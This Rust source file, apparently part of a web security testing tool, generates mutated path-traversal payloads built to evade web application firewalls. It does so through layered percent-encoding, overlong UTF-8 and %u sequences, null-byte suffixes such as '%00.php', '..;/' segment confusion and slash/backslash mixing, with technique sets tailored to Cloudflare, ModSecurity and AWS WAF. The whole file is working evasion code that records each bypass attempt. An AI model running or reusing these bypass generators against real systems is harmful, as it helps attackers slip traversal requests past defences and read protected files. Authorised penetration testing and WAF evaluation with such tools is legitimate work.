use std::collections::HashSet;
use std::sync::OnceLock;

static BYPASS_LOGGER: OnceLock<std::sync::Mutex<Vec<String>>> = OnceLock::new();

fn log_bypass_attempt(family: &str, original: &str, mutated: &str, success: bool) {
    if let Some(logger) = BYPASS_LOGGER.get() {
        let mut log_entries = logger.lock().unwrap();
        log_entries.push(format!(
            "BYPASS_ATTEMPT family={} original={} mutated={} success={}",
            family, original, mutated, success
        ));
    }
}

pub fn get_bypass_logs() -> Vec<String> {
    BYPASS_LOGGER
        .get()
        .map(|logger| logger.lock().unwrap().clone())
        .unwrap_or_default()
}

pub fn clear_bypass_logs() {
    if let Some(logger) = BYPASS_LOGGER.get() {
        logger.lock().unwrap().clear();
    }
}

fn init_bypass_logger() {
    BYPASS_LOGGER.get_or_init(|| std::sync::Mutex::new(Vec::new()));
}

#[derive(Clone, Debug)]
pub struct TransformedPayload {
    pub original: String,
    pub mutated: String,
    pub family: String,
}

fn percent_encode_mixed_case(input: &str) -> String {
    let encoded = percent_encode_upper(input);
    let mut out = String::with_capacity(encoded.len());
    let mut esc_idx = 0usize;
    let mut it = encoded.chars().peekable();
    while let Some(ch) = it.next() {
        if ch == '%' {
            let a = it.next().unwrap_or('%');
            let b = it.next().unwrap_or('%');
            out.push('%');
            if esc_idx.is_multiple_of(2) {
                out.push(a.to_ascii_lowercase());
                out.push(b.to_ascii_uppercase());
            } else {
                out.push(a.to_ascii_uppercase());
                out.push(b.to_ascii_lowercase());
            }
            esc_idx = esc_idx.saturating_add(1);
            continue;
        }
        out.push(ch);
    }
    out
}

fn percent_encode_lower(input: &str) -> String {
    let mut out = String::new();
    for b in input.as_bytes() {
        match *b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'~' => out.push(*b as char),
            b'/' => out.push_str("%2f"),
            b'.' => out.push_str("%2e"),
            b'%' => out.push_str("%25"),
            b'+' => out.push_str("%2b"),
            _ => out.push_str(&format!("%{:02x}", b)),
        }
    }
    out
}

fn percent_encode_upper(input: &str) -> String {
    let mut out = String::new();
    for b in input.as_bytes() {
        match *b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'~' => out.push(*b as char),
            b'/' => out.push_str("%2F"),
            b'.' => out.push_str("%2E"),
            b'%' => out.push_str("%25"),
            b'+' => out.push_str("%2B"),
            _ => out.push_str(&format!("%{:02X}", b)),
        }
    }
    out
}

fn double_encode(input: &str) -> String {
    percent_encode_lower(&percent_encode_lower(input))
}

fn triple_encode(input: &str) -> String {
    percent_encode_lower(&percent_encode_lower(&percent_encode_lower(input)))
}

fn percent_encode_minimal_lower(input: &str) -> String {
    let mut out = String::new();
    for b in input.as_bytes() {
        match *b {
            b'.' => out.push_str("%2e"),
            b'%' => out.push_str("%25"),
            b'+' => out.push_str("%2b"),
            _ => out.push(*b as char),
        }
    }
    out
}

fn percent_encode_minimal_upper(input: &str) -> String {
    let mut out = String::new();
    for b in input.as_bytes() {
        match *b {
            b'.' => out.push_str("%2E"),
            b'%' => out.push_str("%25"),
            b'+' => out.push_str("%2B"),
            _ => out.push(*b as char),
        }
    }
    out
}

fn percent_encode_dots_only_lower(input: &str) -> String {
    let mut out = String::with_capacity(input.len());
    for b in input.as_bytes() {
        match *b {
            b'.' => out.push_str("%2e"),
            b'%' => out.push_str("%25"),
            b'+' => out.push_str("%2b"),
            _ => out.push(*b as char),
        }
    }
    out
}

fn percent_encode_dots_only_upper(input: &str) -> String {
    let mut out = String::with_capacity(input.len());
    for b in input.as_bytes() {
        match *b {
            b'.' => out.push_str("%2E"),
            b'%' => out.push_str("%25"),
            b'+' => out.push_str("%2B"),
            _ => out.push(*b as char),
        }
    }
    out
}

fn percent_encode_slashes_only_lower(input: &str) -> String {
    let mut out = String::with_capacity(input.len());
    for b in input.as_bytes() {
        match *b {
            b'/' => out.push_str("%2f"),
            b'%' => out.push_str("%25"),
            b'+' => out.push_str("%2b"),
            _ => out.push(*b as char),
        }
    }
    out
}

fn percent_encode_slashes_only_upper(input: &str) -> String {
    let mut out = String::with_capacity(input.len());
    for b in input.as_bytes() {
        match *b {
            b'/' => out.push_str("%2F"),
            b'%' => out.push_str("%25"),
            b'+' => out.push_str("%2B"),
            _ => out.push(*b as char),
        }
    }
    out
}

fn mixed_case(input: &str) -> String {
    let mut out = String::with_capacity(input.len());
    let mut upper = true;
    for c in input.chars() {
        if c.is_ascii_alphabetic() {
            if upper {
                out.push(c.to_ascii_uppercase());
            } else {
                out.push(c.to_ascii_lowercase());
            }
            upper = !upper;
        } else {
            out.push(c);
        }
    }
    out
}

fn overlong_utf8_variant(input: &str, dot: &str, slash: &str, backslash: &str) -> String {
    let mut out = String::with_capacity(input.len());
    for ch in input.chars() {
        match ch {
            '.' => out.push_str(dot),
            '/' => out.push_str(slash),
            '\\' => out.push_str(backslash),
            _ => out.push(ch),
        }
    }
    out
}

fn overlong_utf8(input: &str) -> Vec<String> {
    vec![
        overlong_utf8_variant(input, "%c0%ae", "%c0%af", "%c0%5c"),
        overlong_utf8_variant(input, "%c0%2e", "%c0%2f", "%c0%5c"),
        overlong_utf8_variant(input, "%e0%40%ae", "%e0%80%af", "%c0%80%5c"),
    ]
}

fn unicode_u_encoding(input: &str) -> String {
    let mut out = String::with_capacity(input.len());
    for ch in input.chars() {
        match ch {
            '.' => out.push_str("%u002e"),
            '/' => out.push_str("%u2215"),
            '\\' => out.push_str("%u2216"),
            _ => out.push(ch),
        }
    }
    out
}

fn null_byte_suffixes(input: &str) -> Vec<String> {
    if input.contains('\0') {
        return vec![];
    }
    vec![
        format!("{input}%00"),
        format!("{input}%2500"),
        format!("{input}%00.jpg"),
        format!("{input}%2500.jpg"),
    ]
}

fn segment_confusion(input: &str) -> Vec<String> {
    let mut out = vec![];
    if input.contains("../") {
        out.push(input.replace("../", "..;/"));
        out.push(input.replace("../", "..%3b/"));
        out.push(input.replace("../", "..%3B/"));
        out.push(input.replace("../", ".%2e/"));
        out.push(input.replace("../", "%2e%2e/"));
        out.push(input.replace("../", "..././"));
        out.push(input.replace("../", "....//"));
        out.push(input.replace("../", "..%2f"));
        out.push(input.replace("../", "..%2F"));
    }
    if input.contains("..") {
        out.push(input.replace("..", "%2e%2e"));
        out.push(input.replace("..", "%252e%252e"));
    }
    out
}

fn separator_abuse(input: &str) -> Vec<String> {
    let mut out = vec![];
    if input.contains('/') {
        out.push(input.replace("/", "//"));
        out.push(input.replace("/", "/./"));
        out.push(input.replace("/", "///"));
        out.push(input.replace("/", "/../"));
    }
    out
}

fn control_char_separators(input: &str) -> Vec<String> {
    let mut out = vec![];
    if input.contains("../") {
        out.push(input.replace("../", "..%09/"));
        out.push(input.replace("../", "..%0a/"));
        out.push(input.replace("../", "..%0b/"));
        out.push(input.replace("../", "..%01/"));
    }
    out
}

fn path_params(input: &str) -> Vec<String> {
    let mut out = vec![];
    if input.contains('/') {
        out.push(input.replace("/", "/;"));
        out.push(input.replace("/", "/%3b"));
        out.push(input.replace("/", "/%3B"));
    }
    out
}

fn backslash_separators(input: &str) -> Vec<String> {
    let mut out = vec![];
    if input.contains('/') {
        out.push(input.replace("/", "%5c"));
        out.push(input.replace("/", "%5C"));
    }
    out
}

fn slash_backslash_mixed(input: &str) -> Vec<String> {
    let mut out = vec![];
    if !input.contains('/') && !input.contains('\\') {
        return out;
    }
    let mut a = String::with_capacity(input.len());
    let mut b = String::with_capacity(input.len());
    let mut idx = 0usize;
    for ch in input.chars() {
        if ch == '/' || ch == '\\' {
            if idx.is_multiple_of(2) {
                a.push('/');
                b.push('\\');
            } else {
                a.push('\\');
                b.push('/');
            }
            idx = idx.saturating_add(1);
        } else {
            a.push(ch);
            b.push(ch);
        }
    }
    out.push(a);
    out.push(b);
    out
}

// Advanced bypass level 3 techniques
fn multi_layer_encoding(input: &str) -> Vec<String> {
    let mut out = vec![];

    let encoded_once = percent_encode_lower(input);
    out.push(encoded_once.replace("%2f", "%252f"));

    // Quadruple encoding
    out.push(percent_encode_lower(&percent_encode_lower(
        &percent_encode_lower(&percent_encode_lower(input)),
    )));

    // Mixed encoding layers
    out.push(percent_encode_upper(&percent_encode_lower(
        &percent_encode_upper(input),
    )));
    out.push(percent_encode_lower(&percent_encode_upper(
        &percent_encode_lower(input),
    )));

    // URL + Unicode mixed encoding
    let unicode_encoded = unicode_u_encoding(input);
    out.push(percent_encode_lower(&unicode_encoded));
    out.push(percent_encode_upper(&unicode_encoded));

    out
}

fn advanced_null_byte_injection(input: &str) -> Vec<String> {
    let mut out = vec![];

    if input.contains('\0') {
        return out;
    }

    // Null byte at various positions
    if let Some(last_slash) = input.rfind('/') {
        let mut injected = input.to_string();
        injected.insert(last_slash + 1, '\0');
        out.push(injected);
    }

    // Null byte with various encodings
    out.push(format!("{}%00", input));
    out.push(format!("{}%2500", input));
    out.push(format!("{}%u0000", input));
    out.push(format!("{}%00%00", input));
    out.push(format!("{}%2500%2500", input));

    // Null byte in filename extensions
    out.push(format!("{}%00.php", input));
    out.push(format!("{}%00.jpg", input));
    out.push(format!("{}%00.png", input));
    out.push(format!("{}%2500.php", input));

    out
}

fn path_normalization_anomalies(input: &str) -> Vec<String> {
    let mut out = vec![];

    if !input.contains("../") && !input.contains("..\\") {
        return out;
    }

    // Double dot segment variations
    out.push(input.replace("../", "..%2f"));
    out.push(input.replace("../", "..%252f"));
    out.push(input.replace("../", "..%2e%2f"));
    out.push(input.replace("../", "..%252e%252f"));
    out.push(input.replace("../", "%2e%2e%2f"));
    out.push(input.replace("../", "%252e%252e%252f"));

    // Mixed encoding in path segments
    out.push(input.replace("../", "%2e%2e/%2e%2e/"));
    out.push(input.replace("../", "%252e%252e/%252e%252e/"));

    // Extra dot segments
    out.push(input.replace("../", "..././"));
    out.push(input.replace("../", "....//"));
    out.push(input.replace("../", "..//"));

    // Protocol-relative with path traversal
    if input.starts_with("../") {
        out.push(format!("//{input}"));
        out.push(format!("///{input}"));
        out.push(format!("////{input}"));
    }

    out
}

fn mixed_slash_techniques(input: &str) -> Vec<String> {
    let mut out = vec![];

    if !input.contains('/') && !input.contains('\\') {
        return out;
    }

    // Mixed forward/backward slashes with various encodings
    let mut mixed = String::with_capacity(input.len() * 2);
    let mut encoded_mixed = String::with_capacity(input.len() * 2);

    for ch in input.chars() {
        match ch {
            '/' => {
                mixed.push('/');
                mixed.push('\\');
                encoded_mixed.push_str("%2f");
                encoded_mixed.push_str("%5c");
            }
            '\\' => {
                mixed.push('\\');
                mixed.push('/');
                encoded_mixed.push_str("%5c");
                encoded_mixed.push_str("%2f");
            }
            _ => {
                mixed.push(ch);
                encoded_mixed.push(ch);
            }
        }
    }

    out.push(mixed);
    out.push(encoded_mixed);

    // URL encoded mixed slashes
    out.push(input.replace("/", "%2f%5c"));
    out.push(input.replace("\\", "%5c%2f"));
    out.push(input.replace("/", "%2f\\"));
    out.push(input.replace("\\", "%5c/"));

    out
}

fn protocol_relative_manipulation(input: &str) -> Vec<String> {
    let mut out = vec![];

    // Protocol-relative URLs with various encodings
    if input.starts_with("http") || input.starts_with("/") {
        out.push(format!(
            "//{}",
            input
                .trim_start_matches("http:")
                .trim_start_matches("https:")
        ));
        out.push(format!(
            "///{}",
            input
                .trim_start_matches("http:")
                .trim_start_matches("https:")
        ));
        out.push(format!(
            "////{}",
            input
                .trim_start_matches("http:")
                .trim_start_matches("https:")
        ));
    }

    // Double slash variations
    out.push(input.replace("://", ":////"));
    out.push(input.replace("://", "://////"));

    // Protocol with encoded slashes
    out.push(input.replace("://", "%3a%2f%2f"));
    out.push(input.replace("://", "%3a%2f%2f%2f"));

    out
}

fn rfc3986_edge_cases(input: &str) -> Vec<String> {
    vec![
        // RFC 3986 compliance edge cases

        // Percent encoding of already encoded characters
        input.replace("%2f", "%252f"),
        input.replace("%2F", "%252F"),
        input.replace("%5c", "%255c"),
        input.replace("%5C", "%255C"),
        // Mixed case percent encoding (RFC 3986 allows both upper and lower)
        input.replace("%2f", "%2F"),
        input.replace("%2F", "%2f"),
        input.replace("%5c", "%5C"),
        input.replace("%5C", "%5c"),
        // Double encoding of reserved characters
        input.replace("/", "%252f"),
        input.replace("/", "%252F"),
        input.replace("\\", "%255C"),
        input.replace("?", "%253F"),
        input.replace("#", "%2523"),
        // Triple encoding
        input.replace("/", "%25252F"),
        input.replace("\\", "%25255C"),
    ]
}

fn separator_mixed_encoding(input: &str) -> Vec<String> {
    let mut out = vec![];
    if !input.contains('/') {
        return out;
    }
    let mut a = String::with_capacity(input.len());
    let mut b = String::with_capacity(input.len());
    let mut idx = 0usize;
    for ch in input.chars() {
        if ch == '/' {
            if idx.is_multiple_of(2) {
                a.push('/');
                b.push_str("%2f");
            } else {
                a.push_str("%2f");
                b.push('/');
            }
            idx = idx.saturating_add(1);
        } else {
            a.push(ch);
            b.push(ch);
        }
    }
    out.push(a);
    out.push(b);
    out
}

fn families_for_waf(waf_name: &str, bypass_level: u8) -> Vec<&'static str> {
    let name = waf_name.to_lowercase();
    let mut families: Vec<&'static str> = vec![];
    if name.contains("cloudflare") {
        families.extend([
            "separator",
            "segment_confusion",
            "urlencode",
            "urlencode_min",
            "mixed_percent",
        ]);
    } else if name.contains("modsecurity") {
        families.extend([
            "urlencode",
            "double_encode",
            "triple_encode",
            "mixed_case",
            "segment_confusion",
            "urlencode_min",
            "mixed_percent",
        ]);
    } else if name.contains("aws waf") || name.contains("cloudfront") {
        families.extend([
            "urlencode",
            "urlencode_min",
            "separator",
            "double_encode",
            "mixed_percent",
        ]);
    } else {
        families.extend(["urlencode", "urlencode_min", "separator", "mixed_percent"]);
    }
    if bypass_level >= 2 {
        families.push("mixed_case");
        families.push("double_encode");
        families.push("triple_encode");
        families.push("path_params");
        families.push("backslash");
        families.push("separator_mixed");
        families.push("slash_backslash");
        families.push("overlong_utf8");
        families.push("unicode_u");
        families.push("null_byte");
        families.push("dots_only");
        families.push("slashes_only");
        families.push("control_sep");
    }

    if bypass_level >= 3 {
        families.push("multi_layer_encoding");
        families.push("advanced_null_byte");
        families.push("path_normalization");
        families.push("mixed_slash");
        families.push("protocol_relative");
        families.push("rfc3986_edge_cases");
    }
    families
}

fn parse_families(forced: &[String]) -> Vec<String> {
    forced
        .iter()
        .map(|s| s.trim().to_lowercase())
        .filter(|s| !s.is_empty())
        .collect()
}

pub fn generate_payloads(
    original: &str,
    waf_names: &[String],
    bypass_level: u8,
    forced_families: &[String],
    disable_bypass: bool,
) -> Vec<TransformedPayload> {
    if disable_bypass || bypass_level == 0 {
        return vec![TransformedPayload {
            original: original.to_string(),
            mutated: original.to_string(),
            family: "none".to_string(),
        }];
    }

    let mut families: Vec<String> = vec![];
    if !forced_families.is_empty() {
        families.extend(parse_families(forced_families));
    } else if waf_names.is_empty() {
        families.extend([
            "urlencode".to_string(),
            "urlencode_min".to_string(),
            "separator".to_string(),
            "mixed_percent".to_string(),
        ]);
        if bypass_level >= 2 {
            families.push("double_encode".to_string());
            families.push("triple_encode".to_string());
            families.push("path_params".to_string());
            families.push("backslash".to_string());
            families.push("separator_mixed".to_string());
            families.push("slash_backslash".to_string());
            families.push("overlong_utf8".to_string());
            families.push("unicode_u".to_string());
            families.push("null_byte".to_string());
            families.push("dots_only".to_string());
            families.push("slashes_only".to_string());
            families.push("control_sep".to_string());
        }

        if bypass_level >= 3 {
            families.push("multi_layer_encoding".to_string());
            families.push("advanced_null_byte".to_string());
            families.push("path_normalization".to_string());
            families.push("mixed_slash".to_string());
            families.push("protocol_relative".to_string());
            families.push("rfc3986_edge_cases".to_string());
        }
    } else {
        for waf in waf_names {
            families.extend(
                families_for_waf(waf, bypass_level)
                    .iter()
                    .map(|s| s.to_string()),
            );
        }
    }

    let mut out: Vec<TransformedPayload> = vec![TransformedPayload {
        original: original.to_string(),
        mutated: original.to_string(),
        family: "baseline".to_string(),
    }];
    let mut seen: HashSet<String> = HashSet::new();
    seen.insert(original.to_string());

    // Initialize bypass logger
    init_bypass_logger();

    for family in families {
        let variants: Vec<String> = match family.as_str() {
            "urlencode" => vec![
                percent_encode_lower(original),
                percent_encode_upper(original),
            ],
            "urlencode_min" => vec![
                percent_encode_minimal_lower(original),
                percent_encode_minimal_upper(original),
            ],
            "double_encode" => vec![double_encode(original)],
            "triple_encode" => vec![triple_encode(original)],
            "mixed_case" => vec![mixed_case(original)],
            "mixed_percent" => vec![percent_encode_mixed_case(original)],
            "separator" => separator_abuse(original),
            "segment_confusion" => segment_confusion(original),
            "path_params" => path_params(original),
            "backslash" => backslash_separators(original),
            "separator_mixed" => separator_mixed_encoding(original),
            "slash_backslash" => slash_backslash_mixed(original),
            "overlong_utf8" => overlong_utf8(original),
            "unicode_u" => vec![unicode_u_encoding(original)],
            "null_byte" => null_byte_suffixes(original),
            "dots_only" => vec![
                percent_encode_dots_only_lower(original),
                percent_encode_dots_only_upper(original),
            ],
            "slashes_only" => vec![
                percent_encode_slashes_only_lower(original),
                percent_encode_slashes_only_upper(original),
            ],
            "control_sep" => control_char_separators(original),
            "multi_layer_encoding" => multi_layer_encoding(original),
            "advanced_null_byte" => advanced_null_byte_injection(original),
            "path_normalization" => path_normalization_anomalies(original),
            "mixed_slash" => mixed_slash_techniques(original),
            "protocol_relative" => protocol_relative_manipulation(original),
            "rfc3986_edge_cases" => rfc3986_edge_cases(original),
            _ => vec![],
        };
        for mutated in variants {
            if mutated.is_empty() || !seen.insert(mutated.clone()) {
                continue;
            }

            // Log bypass attempt (success status will be determined later during actual requests)
            log_bypass_attempt(&family, original, &mutated, false);

            out.push(TransformedPayload {
                original: original.to_string(),
                mutated,
                family: family.clone(),
            });
        }
    }

    out
}
